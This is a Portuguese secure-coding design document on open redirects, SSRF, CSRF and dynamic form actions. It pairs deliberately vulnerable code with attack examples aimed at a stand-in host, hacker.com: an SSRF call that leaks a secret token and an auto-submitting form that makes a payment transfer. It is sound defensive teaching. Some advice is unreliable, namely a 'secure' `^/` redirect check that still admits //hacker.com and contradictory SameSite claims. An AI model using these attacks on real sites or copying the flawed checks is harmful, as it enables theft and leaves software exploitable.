# SOFTWARE DESIGN DOCUMENT (SDD)

## Segurança Backend — Unvalidated Redirects, SSRF, CSRF e Client-Side Request Forgery

| Campo                | Valor                                                        |
|----------------------|--------------------------------------------------------------|
| **Título**           | Segurança Backend: Unvalidated Redirects, SSRF, CSRF e Client-Side Request Forgery |
| **Versão**           | 1.0                                                          |
| **Data**             | 2026-04-08                                                   |
| **Classificação**    | Confidencial                                                 |
| **Autor**            | Baseado no curso "Segurança Para Devs"                       |

---

## 1. Introdução

### 1.1 Propósito

Este documento descreve o design de segurança para vulnerabilidades no backend que envolvem requisições maliciosas fabricadas ou forjadas. Abrange redirects não validados, Server-Side Request Forgery (SSRF), Cross-Site Request Forgery (CSRF) e Request Forgery no lado do cliente (formulários dinâmicos).

### 1.2 Escopo

- Unvalidated Redirects: redirecionamentos com URL dinâmica baseada em input do usuário
- SSRF (Server-Side Request Forgery): requisições server-side com destino não validado
- CSRF (Cross-Site Request Forgery): falsificação de requisições cross-site via formulários
- Client-Side Request Forgery: ação de formulário com destino dinâmico manipulável
- Nonce / Token Anti-CSRF: implementação de proteção com token de uso único

### 1.3 Definições e Acrônimos

| Termo                    | Definição                                                        |
|--------------------------|------------------------------------------------------------------|
| **Unvalidated Redirect**  | Redirecionamento cujo destino é controlado pelo input do usuário sem validação |
| **SSRF**                 | Server-Side Request Forgery — o servidor faz requisição para destino controlado pelo atacante |
| **CSRF**                 | Cross-Site Request Forgery — formulário de site legítimo submetido a partir de site malicioso |
| **Nonce**                | Token de uso único gerado para validar a origem de uma requisição |
| **CSRF Token**           | Sinônimo de Nonce — campo oculto no formulário validado no servidor |
| **SameSite Cookie**      | Atributo de cookie que restringe envio em requisições cross-site |
| **DOM Clobbering**       | Técnica usada para manipular action de formulário dinâmico       |

### 1.4 Princípio Fundamental: Os 4 Níveis de Proteção

Toda vez que uma URL de destino for dinâmica (redirect, request, action de formulário, href), aplique nesta ordem:

```
┌──────────────────────────────────────────────────────────────┐
│           OS 4 NÍVEIS DE PROTEÇÃO                           │
│                                                              │
│  1ª EVITAR DINÂMICO    → Remover o input dinâmico se         │
│                          possível (mais seguro)              │
│         │                                                    │
│         ▼                                                    │
│  2ª DICIONÁRIO         → Usar chave interna (ID) que         │
│     DE DESTINOS           mapeia para URL real                │
│         │                                                    │
│         ▼                                                    │
│  3ª WHITELIST           → Lista de destinos válidos          │
│     DE DESTINOS           pré-definidos                      │
│         │                                                    │
│         ▼                                                    │
│  4ª VALIDAR FORMATO     → Expressão regular ou validação     │
│                          de prefixo/domínio (último recurso)  │
└──────────────────────────────────────────────────────────────┘

⚠️  Aplica-se a: Redirects, SSRF, Action de formulários, fetch/XMLHttpRequest
```

---

## 2. Visão Geral de Arquitetura

### 2.1 Fluxo de Ataque — Unvalidated Redirect

```
┌──────────────────────────────────────────────────────────────────────┐
│                    UNVALIDATED REDIRECT — FLUXO DE ATAQUE            │
│                                                                      │
│  1. Atacante envia link:                                             │
│     https://site-legitimo.com/login?next=http://hacker.com/login.php │
│                                                                      │
│  2. Usuário clica no link (domínio legítimo, confia)                │
│                                                                      │
│  3. Usuário preenche login e senha no site legítimo                 │
│                                                                      │
│  4. Servidor redireciona para: http://hacker.com/login.php           │
│     → Usuário cai em página idêntica (phishing)                     │
│     → Usuário digita senha novamente                                │
│     → Hacker captura a senha                                        │
│                                                                      │
│  ┌──────────────────────────────────────────────────────────────┐    │
│  │  Variação: POST para site legítimo → redirect para hacker    │    │
│  │  → Usuário envia senha válida → é redirecionado sem          │    │
│  │    perceber → "tente novamente" no site do hacker             │    │
│  └──────────────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────────────┘
```

### 2.2 Fluxo de Ataque — SSRF

```
┌──────────────────────────────────────────────────────────────────────┐
│                    SSRF — FLUXO DE ATAQUE                            │
│                                                                      │
│  ┌─────────────┐       ┌─────────────┐       ┌─────────────────┐    │
│  │  Atacante    │──────→│  Servidor    │──────→│  hacker.com      │    │
│  │  (parceiro)  │       │  Legítimo    │       │  (servidor do    │    │
│  │              │       │              │       │   atacante)      │    │
│  └─────────────┘       └─────────────┘       └─────────────────┘    │
│         │                       │                       │            │
│         │  1. Envia página      │  2. Faz request      │            │
│         │     no parâmetro      │     para URL          │            │
│         │     "page"            │     do atacante       │            │
│         │                       │                       │            │
│         │                       │  3. URL do request    │            │
│         │                       │     contém token      │            │
│         │                       │     secreto na QS      │            │
│         │                       │──────────────────────→│            │
│         │                       │                       │            │
│         │                       │  4. Hacker recebe     │            │
│         │                       │     o token secreto   │            │
│                                                                      │
│  Parâmetro manipulado:                                               │
│    ?page=http://hacker.com/index.php                                │
│    → Servidor faz: GET http://hacker.com/index.php?token=SECRET      │
│    → Hacker recebe o token nos logs do Apache                        │
└──────────────────────────────────────────────────────────────────────┘
```

### 2.3 Fluxo de Ataque — CSRF

```
┌──────────────────────────────────────────────────────────────────────┐
│                    CSRF — FLUXO DE ATAQUE                            │
│                                                                      │
│  ┌─────────────┐       ┌─────────────┐       ┌─────────────────┐    │
│  │  site do     │       │  Navegador  │       │  site-legitimo  │    │
│  │  hacker.com  │       │  da Vítima  │       │  (logado)       │    │
│  └──────┬──────┘       └──────┬──────┘       └────────┬────────┘    │
│         │                     │                       │              │
│         │  1. Contém form     │                       │              │
│         │     HTML oculto:    │                       │              │
│         │     <form action=   │                       │              │
│         │       "http://      │                       │              │
│         │        site-legitimo│                       │              │
│         │        /saque"      │                       │              │
│         │       method="POST">│                       │              │
│         │     <input hidden   │                       │              │
│         │       name="valor"  │                       │              │
│         │       value="1000000">                     │              │
│         │     <input hidden   │                       │              │
│         │       name="chave"  │                       │              │
│         │       value="PIX_HACKER">                   │              │
│         │                     │                       │              │
│         │  2. JS auto-submit  │                       │              │
│         │──────→ (form.submit)│                       │              │
│         │                     │  3. POST com cookies  │              │
│         │                     │──────→ de sessão       │              │
│         │                     │                       │              │
│         │                     │          4. Transferência realizada  │
│         │                     │          sem consentimento           │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 3. Componentes de Design

### 3.1 Componente: Unvalidated Redirects

#### 3.1.1 Descrição

Redirecionamentos cujo destino é construído com base em input do usuário sem validação adequada. O caso mais comum é o parâmetro `?next=` no fluxo de login, onde após a autenticação o usuário é redirecionado para a página que tentou acessar originalmente.

#### 3.1.2 Código Vulnerável

```php
// ❌ VULNERÁVEL — Redirect sem validação
// login.php — após autenticação bem-sucedida
$next = isset($_GET['next']) ? $_GET['next'] : 'index.php';
header("Location: " . $next);
exit;

// header.php — redireciona para login com next dinâmico
if (!isset($_SESSION['user'])) {
    header("Location: login.php?next=" . $_SERVER['REQUEST_URI']);
    exit;
}
```

#### 3.1.3 Código Seguro — 4 Alternativas

```php
// ✅ ALTERNATIVA 1 — Evitar redirect dinâmico (mais seguro)
header("Location: index.php");
exit;

// ✅ ALTERNATIVA 2 — Dicionário de destinos
// ?next=1 → mapeia para index.php, ?next=2 → mapeia para page2.php
$pages = [1 => 'index.php', 2 => 'page1.php', 3 => 'page2.php'];
$id = intval($_GET['next'] ?? 1);
header("Location: " . ($pages[$id] ?? 'index.php'));
exit;

// ✅ ALTERNATIVA 3 — Whitelist de destinos
$whitelist = ['/index.php', '/page1.php', '/page2.php'];
$next = $_GET['next'] ?? '/index.php';
if (!in_array($next, $whitelist)) {
    $next = '/index.php';
    // Log: tentativa de redirect inválido detectada
}
header("Location: " . $next);
exit;

// ✅ ALTERNATIVA 4 — Validar formato (último recurso)
$next = $_GET['next'] ?? '/index.php';
if (!preg_match('/^\//', $next)) {
    $next = '/index.php';
}
header("Location: " . $next);
exit;
```

#### 3.1.4 Armadilha da Validação por Prefixo

```
⚠️  NÃO valide apenas o início da URL sem incluir a barra final

❌ if (str_starts_with($url, "http://localhost"))    // Vulnerável
   → localhost.hacker.com    BURLA
   → localhost@hacker.com    BURLA (HTTP Basic Auth)
   → localhost:123@hacker.com BURLA

✅ if (str_starts_with($url, "http://localhost/"))   // Seguro (com barra)
   → localhost.hacker.com    BLOQUEADO
   → localhost@hacker.com    BLOQUEADO
```

#### 3.1.5 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| UR-1 | Sempre valide o destino de redirects dinâmicos                          | Crítica    |
| UR-2 | Prefira eliminar redirects dinâmicos quando possível                     | Alta       |
| UR-3 | Use dicionário de destinos com chaves internas (IDs)                    | Alta       |
| UR-4 | Use whitelist de destinos conhecidos                                     | Alta       |
| UR-5 | Se validar formato, inclua a barra após o domínio na validação de prefixo | Alta       |
| UR-6 | Em aplicações críticas (fintech, saúde), logue tentativas de redirect inválido | Média |

---

### 3.2 Componente: Server-Side Request Forgery (SSRF)

#### 3.2.1 Descrição

O servidor faz requisições HTTP para destinos controlados pelo atacante. Isso pode vazar tokens secretos, dados sensíveis, ou ser usado para ataques de negação de serviço contra terceiros. O atacante manipula parâmetros de URL que o servidor usa para construir requisições internas.

#### 3.2.2 Código Vulnerável

```python
# ❌ VULNERÁVEL — Requisição server-side com URL dinâmica não validada
@app.route('/analyze')
def analyze():
    page = request.args.get('page')
    # Token secreto exposto na query string
    response = requests.get(page + "?token=" + SECRET_TOKEN)
    return response.text
```

```
Ataque:
  /analyze?page=http://hacker.com/index.php

Resultado:
  O servidor faz: GET http://hacker.com/index.php?token=SECRET_TOKEN
  → O hacker recebe o token secreto nos logs do Apache
```

#### 3.2.3 Código Seguro — 4 Alternativas

```python
# ✅ ALTERNATIVA 1 — Evitar request dinâmico
# Usar include de servidor ou roteamento interno em vez de HTTP request
# para acessar recursos próprios

# ✅ ALTERNATIVA 2 — Dicionário de destinos
PAGES = {
    'home': 'http://localhost/index.php',
    'page1': 'http://localhost/page1.php',
    'page2': 'http://localhost/page2.php',
}

@app.route('/analyze')
def analyze():
    page_id = request.args.get('page')  # Recebe apenas "home", "page1", etc.
    if page_id not in PAGES:
        return "Invalid page", 400
    response = requests.get(PAGES[page_id] + "?token=" + SECRET_TOKEN)
    return response.text

# ✅ ALTERNATIVA 3 — Whitelist de destinos
VALID_HOSTS = ['localhost', 'api.parceiro.com']

# ✅ ALTERNATIVA 4 — Validar formato (com barra!)
if not page.startswith("http://localhost/"):
    return "Invalid page URL", 400
```

#### 3.2.4 Variantes de Ataque SSRF

| Variante                       | Descrição                                                        |
|--------------------------------|------------------------------------------------------------------|
| **Vazamento de token**         | Token secreto incluído na URL da requisição para o servidor do atacante |
| **Acesso a recursos internos** | Requisição para `127.0.0.1`, `localhost`, IPs internos da rede   |
| **Ataque DDoS**                | Múltiplos servidores vulneráveis fazem requisições em massa para um terceiro |
| **Vazamento de dados**         | Webhooks internos acessados via SSRF expondo dados do usuário    |

#### 3.2.5 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| SR-1 | Nunca construa URLs de requisição com input do usuário sem validação     | Crítica    |
| SR-2 | Prefira roteamento interno (include) em vez de HTTP request para recursos próprios | Alta       |
| SR-3 | Use dicionário de destinos para requisições a parceiros                  | Alta       |
| SR-4 | Nunca inclua tokens secretos na query string de requisições externas     | Crítica    |
| SR-5 | Use cabeçalhos HTTP (Authorization) em vez de query string para tokens  | Alta       |
| SR-6 | Valide destino incluindo a barra após o domínio                          | Alta       |
| SR-7 | Considere bloquear requisições para IPs privados (10.x, 172.16.x, 192.168.x) | Média |

---

### 3.3 Componente: Cross-Site Request Forgery (CSRF)

#### 3.3.1 Descrição

Um atacante cria uma página que contém um formulário idêntico ao de um site legítimo. Quando um usuário autenticado acessa essa página, o formulário é submetido automaticamente para o site legítimo, executando ações em nome do usuário sem seu consentimento.

#### 3.3.2 Código Vulnerável

```python
# ❌ VULNERÁVEL — Formulário sem proteção CSRF
@app.route('/')
def index():
    return '''
    <form action="/saque" method="POST">
        <input name="chave_pix" placeholder="Chave PIX">
        <input name="valor" placeholder="Valor">
        <button type="submit">Enviar</button>
    </form>
    '''

@app.route('/saque', methods=['POST'])
def saque():
    chave = request.form.get('chave_pix')
    valor = request.form.get('valor')
    # Realiza transferência SEM validar origem da requisição
    return f"Transferido {valor} para {chave}"
```

```html
<!-- Ataque no hacker.com — formulário idêntico, auto-submetido -->
<form action="http://localhost:5000/saque" method="POST">
    <input type="hidden" name="valor" value="1000000">
    <input type="hidden" name="chave_pix" value="PIX_HACKER">
</form>
<script>document.forms[0].submit();</script>
```

#### 3.3.3 Código Seguro — Nonce / CSRF Token

```python
import secrets
from flask import session

@app.route('/')
def index():
    # Gera token de uso único
    session['nonce'] = secrets.token_hex(16)
    return f'''
    <form action="/saque" method="POST">
        <input type="hidden" name="nonce" value="{session['nonce']}">
        <input name="chave_pix" placeholder="Chave PIX">
        <input name="valor" placeholder="Valor">
        <button type="submit">Enviar</button>
    </form>
    '''

@app.route('/saque', methods=['POST'])
def saque():
    # Valida o nonce
    nonce = request.form.get('nonce')
    if not nonce or nonce != session.get('nonce'):
        return "Erro: requisição inválida", 403

    # Consome o nonce — uso único
    session.pop('nonce', None)

    chave = request.form.get('chave_pix')
    valor = request.form.get('valor')
    return f"Transferido {valor} para {chave}"
```

#### 3.3.4 Código Seguro — SameSite Cookie

```python
# ✅ Cookie com SameSite=Strict (mais seguro)
response.set_cookie('session_id', value, 
                    httponly=True, 
                    secure=True, 
                    samesite='Strict')

# ✅ Cookie com SameSite=Lax (permite navegação por link, bloqueia POST)
response.set_cookie('session_id', value, 
                    httponly=True, 
                    secure=True, 
                    samesite='Lax')
```

#### 3.3.5 Limitações do SameSite

```
┌──────────────────────────────────────────────────────────────────┐
│  LIMITAÇÕES DO COOKIESAMESITE                                   │
│                                                                  │
│  ✅ Resolve:                                                     │
│     • Formulário submetido a partir de site externo (hacker.com) │
│     • Fetch/XMLHttpRequest cross-site                            │
│                                                                  │
│  ❌ NÃO resolve:                                                 │
│     • HTML Injection dentro do próprio site (CMS comprometido)   │
│     • XSS que permite criar e submeter formulários               │
│     • Se o site possui páginas vulneráveis a injeção de HTML     │
│                                                                  │
│  → Mesmo com SameSite, use Nonce/CSRF Token                      │
└──────────────────────────────────────────────────────────────────┘
```

#### 3.3.6 Benefícios Extras do Nonce

| Benefício                         | Descrição                                                        |
|-----------------------------------|------------------------------------------------------------------|
| **Prevenção de dupla submissão**  | Nonce consumido após uso — clique duplo no botão é bloqueado     |
| **Invalidação de formulário**     | Formulários antigos perdem validade após reload ou timeout        |
| **Proteção contra replay**        | Cada nonce só pode ser usado uma vez                              |

#### 3.3.7 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| CF-1 | Use Nonce/CSRF Token em todos os formulários que executam ações          | Crítica    |
| CF-2 | Gere o nonce com CSPRNG (`secrets.token_hex`, `random_bytes`, etc.)     | Crítica    |
| CF-3 | Consuma o nonce após validação (uso único)                               | Alta       |
| CF-4 | Use frameworks que tenham CSRF protection built-in (Django, Laravel, Rails) | Alta       |
| CF-5 | Configure SameSite=Strict ou SameSite=Lax nos cookies de sessão         | Alta       |
| CF-6 | Não rely apenas em SameSite — combine com Nonce                          | Alta       |
| CF-7 | Proteja endpoints que modificam dados (POST, PUT, DELETE)                | Crítica    |

---

### 3.4 Componente: Client-Side Request Forgery (Formulários Dinâmicos)

#### 3.4.1 Descrição

Quando a URL de destino de um formulário (`action`) é construída dinamicamente com base em input do usuário (query string ou parâmetros), um atacante pode manipular o valor para redirecionar a submissão para endpoints não pretendidos. Caso real: vulnerabilidade encontrada no Facebook (bug bounty).

#### 3.4.2 Código Vulnerável

```javascript
// ❌ VULNERÁVEL — Action do formulário dinâmico
// URL: /?env=test
// O nome do ambiente vem da query string
const env = req.query.env;
// Monta o formulário com action dinâmico
res.send(`
  <form action="/${env}" method="POST">
    <input name="valor" placeholder="Valor">
    <button type="submit">Salvar</button>
    <button onclick="location.href='/${env}/delete'">Apagar</button>
  </form>
`);
```

```
Ataque:
  /?env=test%2Fdelete

Resultado:
  O action do formulário se torna: /test/delete
  → Ao salvar, o usuário APAGA o ambiente "test"
  → Sem perceber
```

#### 3.4.3 Código Seguro

```javascript
// ✅ ALTERNATIVA 1 — Action fixa, nome no campo hidden
res.send(`
  <form action="/env" method="POST">
    <input type="hidden" name="env" value="${env}">
    <input name="valor" placeholder="Valor">
    <button type="submit">Salvar</button>
  </form>
`);

// ✅ ALTERNATIVA 2 — Validar formato do env
if (!env.match(/^\w+$/)) {
    return res.status(400).send('Invalid environment name');
}

// ✅ ALTERNATIVA 3 — Dicionário/Whitelist
const validEnvs = await db.query('SELECT name FROM environments');
if (!validEnvs.includes(env)) {
    return res.status(400).send('Invalid environment name');
}
```

#### 3.4.4 Caso Real — Facebook Bug Bounty

```
Vulnerabilidade no Facebook:
  URL legítima: profile.php#profile_log
  → JavaScript fazia POST para /ajax/profile/log

  Ataque: profile.php#/update_status?status=hello
  → JavaScript fazia POST para /ajax/update_status
  → Publicava status em nome do usuário

  Vetor: atacante enviava link com hash manipulado
  → Vítima acessava → status publicado automaticamente
```

#### 3.4.5 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| CR-1 | Nunca construa `action` de formulário com input do usuário sem validação | Crítica    |
| CR-2 | Prefira `action` fixo com dados em campos `hidden`                      | Alta       |
| CR-3 | Valide input com regex restritiva (ex: `/^\w+$/`)                       | Alta       |
| CR-4 | Verifique se o destino é um endpoint válido (dicionário/whitelist)       | Alta       |
| CR-5 | Aplique os mesmos 4 níveis de proteção de redirects/SSRF                | Alta       |

---

## 4. Matriz de Ameaças e Mitigações

| # | Ameaça                              | Vetor                         | Impacto                           | Mitigação                                    | Ref. |
|---|-------------------------------------|-------------------------------|-----------------------------------|----------------------------------------------|------|
| 1 | Phishing via redirect               | `?next=http://hacker.com`     | Roubo de credenciais              | Validar destino / eliminar redirect dinâmico | 3.1  |
| 2 | Redirect transparente               | `?next=http://hacker.com`     | Redirecionamento silencioso       | Whitelist / validação de prefixo com barra    | 3.1  |
| 3 | Bypass de validação por prefixo     | `localhost.hacker.com`        | SSRF bypass                       | Incluir barra após domínio na validação      | 3.1  |
| 4 | Bypass via HTTP Basic Auth          | `localhost:123@hacker.com`    | SSRF bypass                       | Incluir barra após domínio na validação      | 3.1  |
| 5 | Vazamento de token via SSRF         | `?page=http://hacker.com`     | Token secreto exposto             | Dicionário de destinos / não usar QS para tokens | 3.2 |
| 6 | DDoS amplificado via SSRF           | Múltiplos servidores → alvo   | Negação de serviço                | Validar destino / não permitir IPs externos   | 3.2  |
| 7 | Acesso a recursos internos          | `?page=http://127.0.0.1`     | Acesso a APIs internas            | Whitelist de hosts / bloquear IPs privados    | 3.2  |
| 8 | CSRF — Transferência financeira     | Formulário cross-site          | Perda financeira                  | Nonce + SameSite cookie                       | 3.3  |
| 9 | CSRF via CMS comprometido           | HTML injection no próprio site | CSRF mesmo com SameSite           | Nonce (SameSite não resolve)                  | 3.3  |
| 10| CSRF — Alteração de dados           | POST cross-site                | Modificação não autorizada        | Nonce em todos os formulários                 | 3.3  |
| 11| Client-Side Request Forgery         | `?env=test/delete` no action  | Ação não pretendida (delete)      | Action fixa / validar env                     | 3.4  |
| 12| Manipulação de hash (Facebook)      | Hash da URL manipulado         | Publicação não autorizada         | Validar destino do request no JS              | 3.4  |

---

## 5. Checklists de Verificação

### 5.1 Checklist Geral — Backend Security

- [ ] Todos os redirects têm destino fixo ou validado
- [ ] Parâmetro `?next=` / `?redirect=` é validado antes do redirecionamento
- [ ] Nenhuma URL de redirect é construída diretamente com input do usuário
- [ ] Validação de prefixo inclui a barra após o domínio (`http://localhost/`)
- [ ] Requisições server-side não usam input do usuário para montar URLs
- [ ] Tokens secretos são enviados via cabeçalhos HTTP, não query string
- [ ] Dicionário de destinos ou whitelist implementado para requisições a parceiros
- [ ] IPs privados são bloqueados em requisições server-side (SSRF)

### 5.2 Checklist — CSRF Protection

- [ ] Nonce/CSRF Token presente em todos os formulários com ações (POST/PUT/DELETE)
- [ ] Nonce gerado com CSPRNG (`secrets.token_hex`, `random_bytes`, `crypto.randomBytes`)
- [ ] Nonce consumido após uso (removido da sessão)
- [ ] Nonce validado no servidor antes de processar a requisição
- [ ] Cookie de sessão configurado com `SameSite=Strict` ou `SameSite=Lax`
- [ ] Cookie de sessão com `HttpOnly=True` e `Secure=True`
- [ ] Nonce também previne dupla submissão (clique duplo no botão)
- [ ] Framework com CSRF protection built-in está sendo utilizado (quando disponível)

### 5.3 Checklist — Formulários Dinâmicos

- [ ] `action` de formulário nunca é construída com input do usuário
- [ ] Dados dinâmicos estão em campos `hidden`, não no `action`
- [ ] Valores de campos `hidden` são validados no servidor
- [ ] Nomes de recursos (env, slug) são validados com regex restritiva

---

## 6. Tabela Comparativa — Proteções CSRF

| Mecanismo           | Protege contra CSRF externo? | Protege contra XSS interno? | Prevenção de dupla submissão? | Complexidade |
|---------------------|------------------------------|----------------------------|-------------------------------|--------------|
| **Sem proteção**    | ❌ Não                       | ❌ Não                      | ❌ Não                        | Nenhuma      |
| **SameSite=Strict** | ✅ Sim                       | ❌ Não                      | ❌ Não                        | Baixa        |
| **SameSite=Lax**    | ✅ Parcial (não bloqueia POST) | ❌ Não                   | ❌ Não                        | Baixa        |
| **Nonce (CSRF Token)** | ✅ Sim                   | ✅ Sim                      | ✅ Sim                        | Média        |
| **Nonce + SameSite**| ✅ Sim (defesa em profundidade)| ✅ Sim                     | ✅ Sim                        | Média        |

---

## 7. Referências

| Recurso                      | URL/Descrição                                             |
|------------------------------|-----------------------------------------------------------|
| OWASP — Unvalidated Redirects | https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards |
| OWASP — SSRF                 | https://owasp.org/www-community/attacks/Server_Side_Request_Forgery |
| OWASP — CSRF                 | https://owasp.org/www-community/attacks/csrf              |
| MDN — Set-Cookie SameSite    | https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite |
| MDN — SameSite cookies       | https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_attribute |
| Python secrets module        | https://docs.python.org/3/library/secrets.html             |
| Facebook bug bounty (CSRF via hash) | Nota pública do programa de bug bounty do Facebook    |
